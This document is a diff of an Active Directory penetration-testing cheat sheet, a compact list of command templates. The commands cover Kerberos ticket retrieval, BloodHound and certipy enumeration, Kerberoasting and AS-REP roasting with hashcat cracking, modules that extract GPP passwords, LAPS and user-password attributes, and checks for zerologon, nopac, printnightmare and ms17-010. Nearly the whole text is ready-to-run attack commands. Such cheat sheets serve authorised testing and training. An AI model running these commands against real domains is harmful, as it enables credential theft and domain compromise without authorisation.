@@ -2,54 +2,59 @@
 #target/remote #os/linux #cat/ad
 
 ## AD all in one
-
+#faketime
 ```
-getTGT.py <domain>/'<user>'<impacket_auth>
-
-export KRB5CCNAME=$(pwd)/'<user>'.ccache
+getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
 
 bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable
 
-nxc ldap <ip> --use-kcache --bloodhound -c All --dns-server <ip>
+rusthound-ce -z -c All -d <domain> -u '<user>' -k -f <fqdn> -i <dc_ip>
 
-nxc smb <ip> --generate-krb5-file /etc/krb5.conf
+certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap
 
-certipy find -enabled -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -json -output initial_enabled -timeout 2
+nxc ldap <ip> --use-kcache --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --admin-count --pso --pass-pol --gmsa
 
-certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2
+nxc ldap <ip> --use-kcache -M adcs -M badsuccessor -M dns-nonsecure -M dump-computers -M entra-id -M get-network -M get-scriptpath -M maq -M obsolete -M sccm -M subnets -M tombstone -M whoami
 
-parse_certipy.py initial_enabled_Certipy.json
+nxc ldap <ip> --use-kcache -M get-desc-users -M get-info-users -M get-unixUserPassword -M get-userPassword -M laps -M pre2k
 
-nxc ldap <ip> --use-kcache --pass-pol --pso --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa
+GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>' -k -no-pass -dc-host <fqdn>
 
-nxc ldap <ip> --use-kcache -M maq -M sccm -M laps -M adcs -M pre2k -M badsuccessor -M dns-nonsecure -M dump-computers -M get-network -M obsolete
+nxc smb <ip> --use-kcache --shares
 
-GetNPUsers.py -request -outputfile hashes.asreproast <domain>/<user> -k -no-pass -dc-host <fqdn>
+nxc smb <ip> --use-kcache -M enum_av -M enum_ca -M enum_cve -M gpp_privileges -M ioxidresolver -M sccm-recon6 -M smbghost -M webdav -M gpp_autologin -M gpp_password
 
-nxc smb <ip> -u '<user>' --use-kcache --shares
-
-nxc smb <ip> -u '<user>' --use-kcache -M ntlm_reflection -M sccm-recon6 -M printnightmare -M webdav -M spooler -M ioxidresolver -M gpp_autologin -M gpp_password -M ms17-010 -M remove-mic -M smbghost -M enum_ca -M aws-credentials
-
-nxc smb <ip> -u '<user>' --use-kcache --users --rid-brute 10000
+nxc smb <ip> -u '<user>' -p '<password>' -M nopac -M remove-mic
 
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet
 
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet
 
-nxc smb <ip> -u '<user>' --use-kcache -M timeroast
+nxc smb <ip> -u '<user>' -p '<password>' -M timeroast
 
 powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
 ```
 
-## AD new user all in one
+## AD additional user all in one
+#faketime
 ```
-getTGT.py <domain>/'<user>'<impacket_auth>
-
-export KRB5CCNAME=$(pwd)/'<user>'.ccache
+getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
 
 bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable
 
-nxc smb <ip> -u '<user>' --use-kcache --shares
+nxc smb <ip> --use-kcache --shares
 
-certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2
+certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap
+```
+
+## AD sensitive
+```
+nxc smb <ip> -u '<user>' -p '<password>' -M printnightmare
+
+nxc smb <ip> -u '<user>' -p '<password>' -M ms17-010 -M zerologon
+```
+
+## AD admin checks
+```
+
 ```
